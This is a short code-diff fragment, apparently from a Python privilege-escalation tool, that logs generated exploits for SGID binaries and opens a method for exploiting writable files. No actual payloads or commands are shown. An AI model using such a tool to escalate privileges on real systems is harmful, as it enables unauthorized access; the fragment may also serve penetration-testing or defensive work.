+                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for SGID binary {binary_name}")
+                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
+                self.logger.log(LogLevel.INFO, f"  Group access: {group}")
+                
+                exploits.append(exploit)
+            
+        return exploits
     
     def exploit_writable_file(self, vulns):
         """Generate exploits for writable file vulnerabilities"""
